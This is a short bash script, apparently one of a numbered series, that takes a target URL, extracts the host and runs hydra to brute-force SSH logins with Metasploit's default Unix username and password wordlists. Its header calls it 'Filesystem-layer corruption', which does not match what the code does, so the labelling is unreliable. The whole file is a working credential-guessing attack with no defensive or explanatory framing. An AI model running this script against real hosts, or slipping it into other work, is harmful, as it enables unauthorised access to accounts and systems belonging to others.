#!/bin/bash
# V-155 -- Filesystem-layer corruption
# Tool: hydra_fuzzer
# Usage: bash V-155.sh <target> <session_output_dir>

TARGET="${1:?Usage: V-155.sh <target> <session_output_dir>}"
SESSION_DIR="${2:-}"
HOST=$(echo "$TARGET" | sed -E 's|https?://||' | sed 's|/.*$||' | sed 's|:.*$||')

hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt "$HOST" ssh -t 4 -f -v 2>&1 | tail -20
exit $?
